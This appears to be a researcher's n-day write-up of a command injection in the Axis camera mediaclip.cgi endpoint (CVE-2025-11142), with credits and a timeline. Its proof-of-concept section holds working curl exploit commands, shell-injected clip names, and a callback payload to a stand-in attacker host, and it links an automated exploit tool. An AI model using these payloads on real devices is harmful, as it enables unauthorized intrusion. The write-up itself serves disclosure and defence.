---
title: "AXIS OS: Command Injection in mediaclip.cgi via the Clip Name"
date: 2026-10-14
target: "Axis Communications (AXIS OS)"
severity: High
identifier: "CVE-2025-11142"
advisory_url: "https://nvd.nist.gov/vuln/detail/CVE-2025-11142"
fixed: "12.7.36"
fix: "Axis advisory (PDF)"
fix_url: "https://www.axis.com/dam/public/18/0e/90/cve-2025-11142pdf-en-US-519291.pdf"
summary: "The VAPIX mediaclip.cgi update action takes a free-text clip name and passes it, unsanitized, into a shell command on the device. The response body never reflects command output, so the bug is confirmed blind: scaled sleep delays and a callback from the device itself. Independently reproduced by black-box testing after the fix shipped; commands run as a low-privileged service account, not root. Affected AXIS OS 12.6.54 to 12.7.35, fixed in 12.7.36."
---

## Summary

CVE-2025-11142 is an OS command injection in `mediaclip.cgi`, the VAPIX
endpoint that manages the audio clips Axis devices can play (announcements,
alarms, door greetings). The advisory, published 2026-02-10, says the
endpoint "did not have a sufficient input validation" and that Axis "will
not provide more detailed information about the vulnerability." That is the
whole public record: no root cause, no PoC.

This post is an independent reproduction. I found the bug again from the
outside, black-box, against a device I own, and confirmed code execution
with two independent techniques. It is n-day work: the fix (AXIS OS 12.7.36)
shipped before I started, and the original find belongs to researcher
51l3nc3 via the AXIS OS Bug Bounty Program.

## Background

VAPIX is Axis's HTTP API surface. The media clip API lives at
`/axis-cgi/mediaclip.cgi` and speaks HTTP Digest auth (Basic is rejected).
Four actions matter: `upload`, `update`, `play`, `remove`. Each clip is
addressed by an index, and `update` changes a clip's display name, a
free-text `name` parameter with no obvious restrictions.

## The vulnerability

Black-box testing points at a simple mistake: the `name` value is passed,
unsanitized, to a shell invocation on the device, most likely as part of an
internal file-rename or processing step in the media clip subsystem. There
is no source to read here, so the root cause is inferred from behavior, but
the behavior is unambiguous: the full string is executed, not treated as an
inert label.

One detail shapes the whole methodology: the HTTP response never echoes
command output. Every request answers `OK` / `Updating=0` no matter what the
payload does. The bug is blind, so confirmation has to come from side
channels: time, and the network.

## Proof of concept

The `update` action needs an existing clip, so the PoC starts with a tiny
placeholder WAV:

```bash
curl -s --digest -u "$USER:$PASS" --anyauth \
  -X POST "http://$TARGET/axis-cgi/mediaclip.cgi?action=upload&media=audio&name=testclip" \
  -F "file=@poc.wav;type=audio/wav"
```

**Step 1, time-based confirmation.** If the name is executed by a shell, an
injected `sleep` should show up directly in the response time:

```bash
# control
curl -s --digest -u "$USER:$PASS" --anyauth -G "http://$TARGET/axis-cgi/mediaclip.cgi" \
  --data-urlencode "action=update" --data-urlencode "clip=0" \
  --data-urlencode "name=test;sleep 0;"

# injected
curl -s --digest -u "$USER:$PASS" --anyauth -G "http://$TARGET/axis-cgi/mediaclip.cgi" \
  --data-urlencode "action=update" --data-urlencode "clip=0" \
  --data-urlencode "name=test;sleep 8;"
```

The delayed request tracks the injected duration (about 0.3s baseline
versus 8s), which is hard to explain any other way. I scaled the delays
(0/3/6/8 seconds) and rotated injection syntaxes (`;`, `&&`, backticks,
`$(...)`) to rule out coincidence; all of them execute.

**Step 2, out-of-band callback.** The strongest proof does not depend on
timing at all. Start a listener and have the device call back to it:

```bash
# attacker host
nc -lvnp 4444

# payload
curl -s --digest -u "$USER:$PASS" --anyauth -G "http://$TARGET/axis-cgi/mediaclip.cgi" \
  --data-urlencode "action=update" \
  --data-urlencode "clip=0" \
  --data-urlencode "name=test;curl http://ATTACKER_IP:4444/rce_confirmed;"
```

An inbound HTTP request from the device's IP with the `curl` User-Agent can
only originate from a command that actually ran on the device. That is the
confirmation the advisory's "no known exploits" line never had.

**Cleanup.** `action=remove&clip=0` restores the device state; the test clip
is disposable by design.

The repository below ships `poc.py`, which automates the whole sequence
(upload, timing check, callback listener, cleanup) against a target you
specify:

```
usage: poc.py --target 192.168.1.100 --user admin --pass <pw> --callback-ip 192.168.1.50
```

## Impact

Confirmed: arbitrary OS command execution as a low-privileged service
account, after authenticating with an operator or administrator credential.
Not confirmed, and not pursued: escalation from that service account to
root; no SUID or further paths were explored beyond passive enumeration.

Two environmental factors make the bug more than a checkbox in practice.
Axis devices are frequently deployed with default or weak admin credentials,
and the entire client-side SPA that maps the VAPIX API surface, including
this endpoint, is served without authentication, so the attack surface is
trivially discoverable from the login page alone.

## Timeline

- 2025: reported by **51l3nc3** through the AXIS OS Bug Bounty Program.
- 2026-02-10: Axis publishes advisory v1.0 and the fix, AXIS OS 12.7.36;
  no technical detail.
- 2026-09: independent black-box reproduction and PoC tool published.
- 2026-10-14: this write-up.

## Credits and disclosure

- Original discovery and vendor report: **51l3nc3**. This post only
  reproduces the behavior independently.
- [Axis advisory (PDF)](https://www.axis.com/dam/public/18/0e/90/cve-2025-11142pdf-en-US-519291.pdf)
  and [NVD record](https://nvd.nist.gov/vuln/detail/CVE-2025-11142).
- PoC and notes:
  [kemrec/cve-2025-11142-axis-mediaclip-rce](https://github.com/kemrec/cve-2025-11142-axis-mediaclip-rce).

This is n-day research: the fix was public before I looked, no report was
filed by me, and the advisory's own line about "no known exploits" is
exactly why an independent, working PoC is worth documenting.
